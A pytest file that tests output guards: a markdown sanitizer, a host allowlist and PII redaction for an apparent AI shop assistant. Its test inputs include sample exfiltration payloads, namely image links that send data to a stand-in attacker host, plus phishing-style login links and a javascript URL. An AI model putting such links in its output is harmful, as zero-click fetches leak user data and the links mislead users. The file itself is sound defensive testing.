import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from ch13_guards import host_allowed, luhn_ok, redact_pii, sanitize_markdown

EVIL = "exfil-demo.example"


# --------------------------------------------------------------------------- sanitizer


@pytest.mark.parametrize(
    "text",
    [
        f"Revenue was $10. ![rev](https://{EVIL}/c.png?v=10)",
        f'Done ![x](<https://{EVIL}/a.png?d=1> "title")',
        f"![chart][1]\n\n[1]: https://{EVIL}/c.png?d=secret",
        f'<img src="https://{EVIL}/c.gif?n=100">',
        f"<IMG SRC=https://{EVIL}/c.gif?n=100 />",
        f"[click to re-authenticate](https://{EVIL}/login?key=abc)",
        f"Sign in at https://shopflow-refunds.{EVIL}/login now",
        f"Sign in at <https://{EVIL}/login>",
        f"Visit //{EVIL}/x?d=1",
    ],
)
def test_attacker_urls_are_removed(text):
    clean, removed = sanitize_markdown(text)
    assert EVIL not in clean
    assert removed


def test_allowed_link_is_kept_but_images_never_are():
    text = "See [returns](https://help.shopflow.com/returns) ![logo](https://cdn.shopflow.com/l.png)"
    clean, removed = sanitize_markdown(text)
    assert "[returns](https://help.shopflow.com/returns)" in clean
    assert "cdn.shopflow.com" not in clean  # zero-click fetch, even from our own host
    assert removed == ["image:cdn.shopflow.com"]


@pytest.mark.parametrize(
    ("url", "ok"),
    [
        ("https://shopflow.com/a", True),
        ("https://help.shopflow.com/a", True),
        ("https://shopflow.com.exfil-demo.example/a", False),  # suffix trick
        ("https://evilshopflow.com/a", False),  # not a subdomain
        ("https://user@exfil-demo.example/a", False),
        ("javascript:alert(1)", False),
        ("data:image/png;base64,AAAA", False),
        ("//shopflow.com/a", False),  # protocol-relative: refuse rather than guess
    ],
)
def test_host_allowlist(url, ok):
    assert host_allowed(url) is ok


def test_plain_text_and_markdown_are_untouched():
    text = "**100** orders today, 2 cancelled.\n\n- Electronics: $865,585.54\n- [x] done"
    assert sanitize_markdown(text) == (text, [])


def test_defanged_bracket_hosts_do_not_crash_the_sanitizer():
    # Seen in a real run: the model "defanged" the attacker URL; urlsplit raised ValueError.
    text = ("![chart](hxxps://exfil-demo[.]example/c.png?data=1) and "
            "![x](https://exfil-demo[.]example/x.png) [go](https://shopflow[.]com/a)")
    clean, removed = sanitize_markdown(text)
    assert "exfil-demo[.]example" not in clean
    assert len(removed) == 3
    assert not host_allowed("https://shopflow[.]com/a")


# --------------------------------------------------------------------------- PII redaction


@pytest.mark.parametrize(
    ("text", "kind"),
    [
        ("call me at (415) 555-0134", "phone"),
        ("call me at 415-555-0134", "phone"),
        ("call me at +1 415 555 0134", "phone"),
        ("mail jane.roe.1987@gmail.com", "email"),
        ("card 4242 4242 4242 4242 exp 04/29", "card"),
        ("card 4242-4242-4242-4242", "card"),
        ("card 4242424242424242", "card"),
        ("ssn 123-45-6789", "ssn"),
    ],
)
def test_redacts_pii(text, kind):
    clean, counts = redact_pii(text)
    assert counts == {kind: 1}
    assert f"[REDACTED-{kind.upper()}]" in clean


@pytest.mark.parametrize(
    "text",
    [
        "Revenue yesterday was $18,275.53 across 1,234,567 cents.",
        "Order 1404 was placed on 2026-11-07 at 06:59 and shipped 2026-11-08.",
        "SKU SF-ELE-0001 has 3,062 units; ticket 900005 is open.",
        "Write to support@shopflow.com for help.",
        "Reference 1234 5678 9012 3456 fails the Luhn check.",
        "Order total 63196 cents for orders 1, 2 and 1404.",
    ],
)
def test_leaves_business_data_alone(text):
    assert redact_pii(text) == (text, {})


def test_luhn():
    assert luhn_ok("4242424242424242")
    assert luhn_ok("4111111111111111")
    assert not luhn_ok("4242424242424241")
    assert not luhn_ok("4242")  # too short to be a card
